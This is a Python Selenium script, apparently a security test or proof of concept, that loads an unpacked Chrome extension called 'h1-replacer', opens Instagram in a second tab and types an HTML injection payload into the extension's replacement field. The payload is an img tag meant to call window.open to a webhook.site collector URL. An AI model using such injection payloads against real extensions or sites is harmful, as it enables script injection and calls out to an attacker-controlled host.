# # test codes for selenium

import time

# from selenium import webdriver
from selenium.webdriver import ActionChains, Chrome, ChromeOptions, Keys
# from selenium.webdriver.chrome.service import Service
from selenium.webdriver.common.by import By
# from selenium.webdriver.chrome.options import Options
# from selenium.webdriver.support.wait import WebDriverWait
# from selenium.webdriver.support import expected_conditions as EC

# from webdriver_manager.chrome import ChromeDriverManager
# from pyvirtualdisplay import Display

# with Display(backend="xvfb") as display:
#     print(display.is_alive())
# print(display.is_alive())

# options = webdriver.ChromeOptions()
# # options.add_experimental_option('detach', True)
# options.add_extension('./extension_2_0_13_0.crx')
# # options.add_argument('load-extension=../test/gtranslateext')

# chrome_service = Service(executable_path=ChromeDriverManager().install())
# driver = Chrome(service=chrome_service, options=options)

# # driver = webdriver.Chrome('./chromedriver', options=options)

# # extensions = driver.execute_script("return chrome.runtime.getManifest();")

# # print(extensions)
# time.sleep(2)
# # id = driver.execute_script("return chrome.runtime.id;")
# # print(id)

# # driver.get("chrome://system")


# # trust
# driver.get("chrome-extension://aapbdbdomjkkjkaonfhkkikfgjllcleb/popup.html")

# # driver.get("https://www.411-spyware.com/de/es-ist-die-ungesetzliche-tatigkeit-enthullt-bundespolizei-virus-entfernen")

# input_field = driver.find_element(By.ID, 'text-input')

# time.sleep(5)

# input_field.send_keys('酒')

# time.sleep(5)
# # Find the button by its ID and click on it
# button = driver.find_element(By.CLASS_NAME, 'goog-inline-block')
# button.click()

# print(driver.page_source)
# # fun = driver.find_element(By.ID, 'funstuff')
# display.stop()

from os import path
import hashlib

from pyvirtualdisplay.display import Display
from selenium.webdriver import Chrome, ChromeOptions
from selenium.webdriver.chrome.service import Service

abs_path = path.abspath("h1-replacer")
print(abs_path)
m = hashlib.sha256()
m.update(abs_path.encode("utf-8"))
ext_id = "".join([chr(int(i, base=16) + 97) for i in m.hexdigest()][:32])
mh = f"chrome-extension://{ext_id}/popup.html"
print(mh)

with Display() as disp:
    print(disp.is_alive())
    options = ChromeOptions()
    options.add_argument("--disable-dev-shm-usage")
    options.add_argument("--no-sandbox")
    # options.add_extension('./extension_2_0_13_0.crx')
    load_ext_arg = "load-extension="+abs_path
    options.add_argument(load_ext_arg)

    driver = Chrome(service=Service(), options=options)
    driver.get(mh)
    # driver.get("chrome://extensions")

    # driver.get("chrome-extension://aapbdbdomjkkjkaonfhkkikfgjllcleb/popup.html")
    # time.sleep(3)
    # input_field = driver.find_element(By.ID, 'text-input')
    # time.sleep(5)
    # input_field.send_keys('酒')
    # time.sleep(5)
    # # Find the button by its ID and click on it
    # button = driver.find_element(By.CLASS_NAME, 'goog-inline-block')
    # button.click()

    original = driver.current_window_handle

    driver.switch_to.new_window('tab')

    new = driver.current_window_handle

    driver.get('https://instagram.com')

    # # driver.get("chrome-extension://aapbdbdomjkkjkaonfhkkikfgjllcleb/popup.html")
    time.sleep(3)
    driver.get_screenshot_as_file("ss.png")

    driver.switch_to.window(original)

    a = driver.find_element(By.ID,'replacementInput')

    payload = '<img src="window.open(`https://webhook.site/9aa600fc-057a-445d-b039-d62660ade568`)">'

    a.send_keys(payload)

    driver.get_screenshot_as_file("ss.png")

    b = driver.find_element(By.ID, 'replaceButton')

    time.sleep(3)

    driver.get_screenshot_as_file("ss.png")

    b.click()
    
    driver.switch_to.window(new)
    driver.get_screenshot_as_file("ss.png")

    driver.switch_to.window(original)

    print(driver.page_source)

# print(ext_id)


# import hashlib

# path = ''
# m = hashlib.sha256()
# m.update(bytes(path.encode("utf-8")))
# ext_id = "".join([chr(int(i,base=16) + 97) for i in m.hexdigest()][:32])
# print(ext_id)